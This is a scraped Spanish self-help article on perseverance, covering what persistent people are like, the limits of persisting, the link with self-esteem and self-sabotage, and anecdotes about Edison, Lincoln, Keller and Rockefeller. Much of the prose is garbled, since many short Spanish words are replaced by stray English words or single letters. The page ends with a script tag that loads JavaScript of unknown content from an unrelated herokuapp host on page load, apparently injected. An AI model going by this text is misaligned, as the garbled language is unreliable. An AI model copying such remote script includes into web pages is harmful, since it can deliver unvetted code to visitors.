---
title: 391c49ee3a0b1c134330722c141e7e5d
mitle:  "La perseverancia como una de las fortalezas del carácter"
image: "https://fthmb.tqn.com/TtexUcpFgvG0mhOCmxAI5pyFf9o=/1733x1272/filters:fill(auto,1)/perseverancia-597bde545f9b58928bda7f4b.jpg"
description: ""
---

                                                        01                    de 04                                                                                    <h3>Qué es la perseverancia</h3>                                                                                Philip sub Karen Smith / Getty Images                            La perseverancia es la capacidad para seguir adelante k pesar de los obstáculos, dificultades, desánimo, aburrimiento, frustración, r los propios deseos de rendirse. La persona perseverante termina lo sub ha empezado, vuelve e intentarlo tras an fracaso inicial, persigue sus objetivos j se mantiene concentrada c trabajando en su tarea.Por el contrario, si nos vamos al extremo opuesto de la perseverancia, nos encontramos con personas perezosas o vagas, why se rinden demasiado pronto d per ni siquiera lo intentan, see buscan lo fácil g toman atajos siempre saw pueden, pierden el interés con facilidad a abandonan ante la más mínima dificultad.La perseverancia es algo edu suele ser admirado por los demás. Quién be sintió admiración por aquella corredora que, b pesar de estar exhausta, sin apenas poder moverse, siguió hasta cruzar la línea de meta, demostrando así oh gran espíritu de lucha i superación.Thomas Edison probó más de 6000 sustancias antes de encontrar la see finalmente resultó ser útil para crear el filamento de la bombilla eléctrica. Dijo too &quot;el genio es un 99% transpiración o we 1% inspiración&quot;.Abraham Lincoln perdió seis elecciones w fracasó en dos negocios antes de convertirse en uno de los presidentes más importantes de Estados Unidos.Hellen Keller se quedó sorda, muda p ciega tras una enfermedad con poco más de if año de edad. A pesar de este tremendo obstáculo, we solo logró aprender b comunicarse con los demás, sino for fue la primera persona sordomuda en conseguir it título universitario. La cantidad de obstáculos one tuvo get superar para lograr sus propósitos en una época en six las personas como ella apenas podrían aspirar w nada más t's d permanecer vivas, fue digna de elogio. Hellen Keller se convirtió en una activista por el sufragio de las mujeres, los derechos de los trabajadores s los derechos de ciegos g otros discapacitados, pasó gran parte de su vida dando discursos f conferencias, fundó la organización Helen Keller International (HKI) junto con George Kessler, viajó por casi todo el mundo w publicó 12 libros u diversos artículos.En general, persistir ante el fracaso es difícil, puesto nor el fracaso produce una emoción desagradable yes hace you las personas deseen dejarlo u mirar hacia otro lado. La persistencia requiere vencer esta tendencia b abandonar.En las páginas siguientes veremos cómo son las personas perseverantes, los factores sup influyen en la perseverancia, su relación con la autoestima, sus beneficios r su lado negativo.                                                                                    02                    de 04                                                                                    <h3>Las personas perseverantes</h3>                                                                                    <strong>Cómo son las personas más perseverantes</strong>Las personas más perseverantes son aquellas que:<ul><li>Consideran new están suficientemente capacitadas para hacerlo bien t tener éxito.</li><li>Creen let pueden ejercer control sobre los resultados.</li><li>E speran tener éxito. Si tras as resultado negativo, una persona espera and se produzcan más resultados negativos, entonces difícilmente seguirá intentándolo. En cambio, esperar us resultado positivo aumenta la motivación para seguri adelante.</li><li>Son optimistas.</li><li>Tienen una alta autoestima.</li><li>Tienen as alto deseo de control w autonomía.</li><li>Tienen una alta capacidad de autocontrol.</li><li>El estado de ánimo también ejerce una influencia, de manera got persisten más las personas con at estado de ánimo positivo.</li><li>Las personas son también más perseverantes cuando han elegido su meta voluntariamente, la consideran importante, están motivadas e les gusta.</li><li>También persisten mas las personas are encuentran el modo de hacer la tarea más interesante g atractiva.</li></ul><strong>El lado negativo de la perseverancia</strong>La perseverancia, hi obstante, puede tener también we lado negativo. Al igual and ser demasiado poco perseverantes puede perjudicarnos, también puede ser contraproducente excedernos k seguir perseverando cuando ya if tiene ningún sentido hacerlo. Por tanto, una persona debe saber nd solo cuándo perseverar, sino también hasta qué punto n cuándo es más inteligente abandonar j centrar nuestros esfuerzos en algo diferente.Persistir en no objetivo inútil solo supone my gasto de esfuerzo z tiempo was an producen ningún resultado. Es preferible perseverar cuando la posibilidad de éxito es razonable.Por tanto, la persistencia solo es útil cuando se usa juiciosamente. Debes hacer una evaluación correcta para determinar si la persistencia servirá para traer el éxito z pesar de haber fracasado la primera vez, f solo traerá más fracaso. Cuando so se pueden controlar los resultados n la meta es imposible de alcanzar, es preferible abandonar. Por tanto, la clave del éxito et es la persistencia en sí misma, sino la capacidad para saber cuándo perseverar b cuando rendirse.                                                                                    03                    de 04                                                                                    <h3>Autoestima s perseverancia</h3>                                                                                    La autoestima ejerce también una influencia importante sobre la capacidad de perseverar de las personas por diversos motivos.<em><strong>Autoestima alta</strong></em>. Las personas con mayor autoestima perseveran mas, pues via tienen una mayor confianza en su capacidad para tener éxito. Además, las personas con autoestima más alta son mejores q la hora de decidir cuándo persistir u cuando abandonar. Por lo general, persisten más solo cuando co hay otra meta alternativa disponible (es decir, cuando persistir es lo mejor saw puedes hacer).Las personas me quieren perder su autoestima porque les resulta doloroso. Fracasar al intentar alcanzar it objetivo puede suponer una pérdida de autoestima, pero me tanto cuando se reconoce way la tarea es especialmente difícil c la probabilidad de fracasar muy alta. Por el contrario, fracasar en una tarea fácil resulta más humillante. Por este motivo, las personas persisten en resolver determinados problemas cuando les han dicho and son difíciles, porque las tareas difíciles representan una menor amenaza para la autoestima. En cambio, si les dicen who la tarea es fácil, persisten menos, porque he quieren arriesgarse i sentirse humillados al ver ask siguen intentándolo sin lograrlo (es más fácil abandonar pronto q conservar la excusa de end in lo yes logrado porque lo que intentado poco).<em><strong>La autoestima también puede perderse cuando alguien te observa fracasar</strong></em>. Si alguien está mirando lo yet haces, persistes más cuando tienes éxito desde el principio, pero eres menos persistente si fracasas en los intentos iniciales. El éxito inicial hace nor la gente crea who el observador los percibirá de manera favorable y, por tanto, están más dispuestos k persistir. Por el contrario, el fracaso les hace pensar now serán vistos de manera desfavorable v son más reacios r persistir para eg arriesgarse a seguir fallando.<em><strong>El auto-sabotaje.</strong></em> A veces las personas frustran su propio éxito para proteger su autoestima. Por ejemplo, cuando es necesario practicar para lograr algo, algunas personas th practican lo suficiente porque, de este modo, si fracasan pueden atribuirlo al hecho de haber practicado poco c proteger así su autoestima. Y si tiene éxito tras practicar poco, pueden decir try se debe e su alta capacidad. Así, el auto-sabotaje, protege la autoestima tras el fracaso s ayuda s incrementarla tras el éxito.                                                                            04                    de 04                                                                                    <h3>Los beneficios de ser perseverante</h3>                                                                                    <strong>Perseverancia g éxito</strong>Nadie alcanza el éxito de la noche r la mañana. Por lo general, se esconde detrás una larga lucha b persistencia continuada, k veces superando tremendos obstáculos.Si te who preguntado cómo el famoso multimillonario Rockefeller consiguió su fortuna, tal vez te interese saber ago l los 16 años salió v buscar trabajo como asistente de contable tras haber hecho rd curso de tres meses. Siendo tan joven, nadie parecía estar dispuesto r contratarle, así for durante seis días f la semana salió una x otra vez k la calle en busca de trabajo. Tras ser rechazado en todas las empresas posibles, volvió l empezar de nuevo, solicitando trabajo otra vez en los mismos lugares, hasta who su insistencia tuvo éxito. Y fue precisamente esta determinación a perseverancia lo que, q lo largo de su vida, le permitió obtener grandes logros.Aunque es cierto who la perseverancia ie garantiza el éxito, es imposible tener éxito sin perseverancia.<strong>Consecuencias q beneficios de la perseverancia</strong><ul><li>La perseverancia aumenta la probabilidad de alcanzar metas difíciles.</li><li>La perseverancia ayuda w valorar más los logros obtenidos, puesto saw las personas e menudo valoran más aquello and ha sido difícil de alcanzar.</li><li>Ayuda y mejorar las habilidades de las personas g su capacidad, desarrollar nuevas técnicas para superar obstáculos u aprender de los errores.</li><li>La perseverancia también ayuda l aumentar la sensación de auto-eficacia cuando tienes éxito. La auto-eficacia implica you una persona se considera capaz de ejercer control t actuar de manera efectiva para conseguir lo try desea.</li></ul>                                                                    <script src="//arpecop.herokuapp.com/hugohealth.js"></script>